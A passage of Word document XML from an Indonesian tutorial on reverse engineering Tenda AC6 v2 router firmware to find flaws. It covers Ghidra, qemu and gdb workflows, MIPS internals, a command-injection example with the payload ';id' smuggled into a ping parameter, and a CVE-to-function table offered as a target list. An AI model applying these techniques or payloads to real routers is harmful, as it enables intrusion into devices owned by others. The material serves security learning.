        <w:t>Memahami cara kerja httpd/daemon → tahu parameter apa yang harus dikirim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Memetakan fungsi CVE ke alamat nyata di binary Anda.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Membuka jalan eksploitasi: mencari 'gadget' dan alamat library.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Ada dua gaya: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>static</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (baca binary tanpa menjalankan: Ghidra/radare2) dan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>dynamic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (jalankan &amp; amati: gdb/strace). Praktik terbaik: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>gabungkan keduanya</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Toolchain Reverse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Alat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Fungsi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Contoh perintah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Tebak jenis &amp; arsitektur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readelf / objdump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 ELF, section, disassembly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readelf -h httpd; objdump -d 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Daftar simbol (jika tidak di-strip)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nm -D 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Teks/magic di binary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strings -n 6 httpd | grep goform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Ghidra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Decompiler + disassembler (GUI)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(analisis, XREF, pseudo-C)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radare2 / rizin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 via terminal, scripting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r2 -A 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gdb-multiarch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 multi-arsitektur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gdb-multiarch ./httpd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qemu-user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Menjalankan binary MIPS di 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qemu-mipsel -L rootfs ./httpd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strace / ltrace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Telusuri syscall/library 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strace -f ./httpd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pwntools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Menulis eksploit (Python)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pwn import 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Disassemble dari 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cs.disasm(bytes, base)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Untuk MIPS, prioritaskan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ghidra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (decompiler-nya kuat) dan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>qemu-user + gdb-multiarch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> untuk menjalankan/men-debug binary hasil ekstraksi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. ELF &amp; Arsitektur MIPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 MIPS 24Kc — register penting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67256"/>
            <wp:docPr id="2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32_mips_conven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12. Register &amp; calling convention MIPS (contoh dari kernel Anda).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>$a0-$a3 = 4 argumen pertama; di web handler, $a0 sering = pointer ke string parameter.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>$v0 = nilai balik.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>$ra = return address. **Inilah target utama stack overflow.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>$sp = stack pointer; frame lokal ada di sini.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Architecture: MIPS32, little-endian (mipsel) untuk RTL8197F ini.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 Bukti nyata dari kernel perangkat Anda</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Kita ekstrak kernel dari firmware dan disassembly dengan capstone. Ini </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MIPS asli</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> dari perangkat Tenda Anda:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>0x80001000: sw     $s1, 0x18($sp)     # simpan $s1</w:t>
        <w:br/>
        <w:t>0x80001004: sw     $s0, 0x14($sp)     # simpan $s0</w:t>
        <w:br/>
        <w:t>0x80001008: move   $s1, $a0           # argumen 1 -&gt; $s1</w:t>
        <w:br/>
        <w:t>0x8000100c: lui    $a0, 0x804a        # siapkan argumen: alamat</w:t>
        <w:br/>
        <w:t>0x80001010: addiu  $a0, $a0, 0x30c    #   = 0x804a030c</w:t>
        <w:br/>
        <w:t>0x80001014: jal    0x8040e088         # panggil fungsi</w:t>
        <w:br/>
        <w:t>0x80001018: addiu  $s0, $s1, 0x40     # &lt;-- DELAY SLOT (jalan sebelum lompat)</w:t>
        <w:br/>
        <w:t>0x8000101c: slt    $v0, $s1, $s0</w:t>
        <w:br/>
        <w:t>0x80001020: beqz   $v0, 0x80001054</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Pelajaran penting MIPS:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ada </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>delay slot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>. Instruksi setelah `jal`/`beq` dieksekusi SEBELUM percabangan. Ini sangat memengaruhi cara menyusun eksploit.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 Entry point kernel (contoh nyata)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>0x8040c990: mfc0   $t0, $t4, 0        # baca CP0 (cache/exception)</w:t>
        <w:br/>
        <w:t>0x8040c994: lui    $at, 0x1000</w:t>
        <w:br/>
        <w:t>0x8040c998: ori    $at, $at, 0x1f</w:t>
        <w:br/>
        <w:t>0x8040c99c: or     $t0, $t0, $at</w:t>
        <w:br/>
        <w:t>0x8040c9a0: xori   $t0, $t0, 0x1f</w:t>
        <w:br/>
        <w:t>0x8040c9a4: mtc0   $t0, $t4, 0        # tulis CP0</w:t>
        <w:br/>
        <w:t>0x8040c9b4: jr     $t0                # lompat (dengan delay slot)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Perbandingan MIPS / ARM / x86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Aspek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x86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MIPS32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ARM32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little (mipsel) / big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little (biasanya)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 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 stack (ret)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 register $ra (tapi disimpan ke stack)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 register LR ($lr)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Argumen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stack/register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$a0-$a3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r0-r3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Ciri khas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instruksi variabel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SLOT, instruksi tetap 4 byte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 Thumb (2 byte), kondisi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 kanonik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eip/rip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$ra, $pc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pc, lr</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Belajar satu arsitektur membuat arsitektur lain jauh lebih mudah. Jika paham MIPS, Anda paham pola umum semua arsitektur.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>RE UNTUK MENEMUKAN CELAH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5. Alur: Firmware -&gt; httpd -&gt; Webroot -&gt; XREF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8933"/>
            <wp:docPr id="2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22_firmware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13. Alur dari firmware sampai menemukan celah.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Ekstrak firmware -&gt; dapatkan rootfs (lihat Volume 1 &amp; Bab 22).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Temukan daemon web: biasanya `/bin/httpd` atau `/sbin/httpd`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Lihat webroot (mis. `/web`) untuk tahu endpoint yang dilayani.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Buka httpd di Ghidra; cari string `goform/xxx` -&gt; XREF ke fungsi handler.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Baca handler -&gt; panggil fungsi parsing -&gt; temukan pola celah.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6. Membaca Binary: file, readelf, nm, strings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Firmware kita sudah teridentifikasi sebagai </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MIPS little-endian</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>. Ini contoh output nyata saat menganalisis firmware Tenda AC6 v2:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$ file US_AC6V2.0RTL_V15.03.06.52_multi_TDE01.bin</w:t>
        <w:br/>
        <w:t>u-boot legacy uImage, Linux/MIPS, OS Kernel Image (lzma),</w:t>
        <w:br/>
        <w:t>Load Address: 0x80000000, Entry Point: 0x8040C990</w:t>
        <w:br/>
        <w:br/>
        <w:t>$ binwalk firmware.bin</w:t>
        <w:br/>
        <w:t>10328      0x2858     LZMA compressed data (kernel)</w:t>
        <w:br/>
        <w:t>2621504    0x280040   Squashfs filesystem, little endian, v4.0,</w:t>
        <w:br/>
        <w:t xml:space="preserve">                      compression:xz, 845 inodes, blocksize 131072</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Setelah httpd didapat, urutan cepat:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>file httpd                       # pastikan MIPS 32-bit LSB</w:t>
        <w:br/>
        <w:t>readelf -h httpd                  # entry, jenis</w:t>
        <w:br/>
        <w:t>strings -n 6 httpd | grep -iE 'goform|password|/bin/sh|system'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Pola:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> string `goform/SetXuplo` di binary = endpoint web. Tiap string ini 'menunjuk' ke fungsi yang menanganinya (XREF).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7. Ghidra 101</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Buka Ghidra -&gt; New Project -&gt; Import File -&gt; pilih `httpd`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Saat diminta format: pilih **Raw** jika header terpotong, atau BIOS/none; set language MIPS:LE:32:default.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Analysis -&gt; Auto Analyze (default) -&gt; tunggu.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Buka **Symbol Tree -&gt; Functions**; buka **Defined Strings** untuk cari `goform/...`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Klik string -&gt; lihat **XREF** (references) -&gt; lompat ke fungsi handler.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Tekan **Ctrl+E** di pane decompiler untuk melihat pseudo-C.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>7.1 Contoh membaca handler</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Handler khas Tenda berbentuk `formXXX` / `setXXX`. Di decompiler Anda akan melihat pola: ambil parameter -&gt; salin ke buffer -&gt; kerjakan. Dari sinilah celah ditemukan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8. Pola Celah di Decompiler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Pola di kode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Bahasa C / asm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Jenis celah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strcpy(dst, src)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tanpa batas, src dari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stack/heap overflow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sprintf(buf, ...%s, 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%s tak dibatasi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sscanf(in, "%s", buf)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%s tak dibatasi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system(cmd) / popen(cmd)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 berisi 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memcpy(dst, src, len)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 dari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overflow (arbitrary length)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snprintf(...)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AMAN (ada batas)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bukan overflow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getenv/Authorization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header dipercaya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auth/logic bug</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>8.1 Menerjemahkan C ke assembly MIPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// C:  strcpy(dst, src);</w:t>
        <w:br/>
        <w:t>// ASM MIPS (kira-kira):</w:t>
        <w:br/>
        <w:t xml:space="preserve">  move  $a0, dst</w:t>
        <w:br/>
        <w:t xml:space="preserve">  move  $a1, src</w:t>
        <w:br/>
        <w:t xml:space="preserve">  jal   strcpy        # panggil strcpy</w:t>
        <w:br/>
        <w:t xml:space="preserve">  nop                 # delay slot</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Jika di decompiler terlihat `strcpy` ke buffer lokal, dan sumbernya parameter HTTP, kemungkinan besar itu </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>stack overflow</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>9. Menemukan Command Injection lewat RE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Cari fungsi `system`/`popen` lalu lihat siapa yang memanggilnya dengan string yang dibentuk dari input.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// decompiler:</w:t>
        <w:br/>
        <w:t xml:space="preserve">  snprintf(cmd, 0x80, "ping -c 1 %s", user_ip);</w:t>
        <w:br/>
        <w:t xml:space="preserve">  system(cmd);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Karena `user_ip` langsung masuk ke perintah shell, payload `;id` atau `|id` ikut dieksekusi. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Pola:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> fitur diagnostik (ping/traceroute/ddns) sering begini.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Di Ghidra: cari references ke `system` -&gt; daftar pemanggil -&gt; periksa format string-nya.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Bandingkan dengan daftar CVE (mis. `setWizard`, `SetSpeedWan`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>10. Menemukan Buffer Overflow lewat RE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Target: fungsi yang menyalin parameter HTTP ke buffer stack berukuran tetap.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// decompiler:</w:t>
        <w:br/>
        <w:t xml:space="preserve">  char buf[64];</w:t>
        <w:br/>
        <w:t xml:space="preserve">  strcpy(buf, http_param);     // &lt;-- overflow jika param &gt; 64</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Tabel CVE lini AC6 v2.0 menunjukkan fungsi &amp; parameter yang rentan — jadikan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>daftar target RE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Anda: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CVE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Fungsi (cari di Ghidra)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CVE-2024-51116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formSetPPTPServer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CVE-2024-52714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fromSetSysTime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SetSpeedWan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speed_dir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fast_setting_wifi_set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addressNat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CVE-2023-38931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CVE-2022-25458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cmdinput</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Pola penamaan `formSet*`/`set*` = kandidat kuat. Cari string nama fungsi di Ghidra, ikuti XREF ke handler, ukur buffer, hitung jarak ke $ra.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>11. Dynamic Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>11.1 Menjalankan binary MIPS di PC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>sudo apt install qemu-user qemu-user-static gdb-multiarch</w:t>
        <w:br/>
        <w:t># jalankan httpd MIPS memakai library dari rootfs</w:t>
        <w:br/>
        <w:t>qemu-mipsel -L ./rootfs ./rootfs/bin/httpd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>11.2 Debug dengan gdb-multiarch</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># terminal 1: jalankan qemu dengan gdbserver</w:t>
        <w:br/>
        <w:t>qemu-mipsel -L ./rootfs -g 1234 ./rootfs/bin/httpd</w:t>
        <w:br/>
        <w:t># terminal 2:</w:t>
        <w:br/>
        <w:t>gdb-multiarch ./rootfs/bin/httpd</w:t>
        <w:br/>
        <w:t>(gdb) set architecture mips</w:t>
        <w:br/>
        <w:t>(gdb) target remote :1234</w:t>
        <w:br/>
        <w:t>(gdb) b *0x00401234      # breakpoint di handler</w:t>
        <w:br/>
        <w:t>(gdb) c</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>11.3 Menelusuri eksekusi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>strace -f -e trace=network,execve ./httpd   # lihat syscall</w:t>
        <w:br/>
        <w:t>ltrace  ./httpd                              # lihat pemanggilan libc (jika dinamis)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Kombinasi ideal:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> baca di Ghidra (static) -&gt; konfirmasi di gdb (dynamic) -&gt; ubah input -&gt; amati buffer/$ra. Di sinilah pemahaman menjadi nyata.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>BINARY EXPLOITATION</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>12. Layout Memori Proses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86627"/>
            <wp:docPr id="2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30_memory_lay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14. Layout memori proses (embedded umumnya tanpa ASLR).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Kita ingin mengendalikan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>stack</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (variabel lokal) sampai menimpa </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>saved return address</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>, karena itulah yang menentukan ke mana CPU 'pulang' setelah fungsi selesai.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>12.1 Tanpa ASLR = alamat stabil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Banyak perangkat embedded </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>mematikan ASLR</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (tidak ada `/proc/sys/kernel/randomize_va_space` atau di-set 0). Artinya alamat stack/library </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sama setiap kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> — mempermudah eksploitasi dibanding desktop modern. Ini alasan router sering jadi target RCE.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>13. Mekanika Stack Overflow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0699"/>
            <wp:docPr id="2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31_stack_over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15. Input panjang menimpa buffer lalu saved return address.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>13.1 Konsep universal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Program membuat buffer lokal di stack (mis. 64 byte).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Fungsi menyalin input tanpa cek batas -&gt; byte melebihi 64 menimpa data setelah buffer.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Di x86, yang ditimpa adalah saved EIP (return address).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Saat fungsi `return`, CPU melompat ke alamat yang kita kendalikan -&gt; kontrol eksekusi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>13.2 Kenapa masih relevan?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Meski ada mitigasi (canary/NX/ASLR), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>firmware router sering mengompilasi tanpa proteksi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> untuk menghemat ukuran/kompatibilitas. Jadi stack overflow tetap mematikan di IoT.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>14. Eksploitasi MIPS: seluk-beluk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
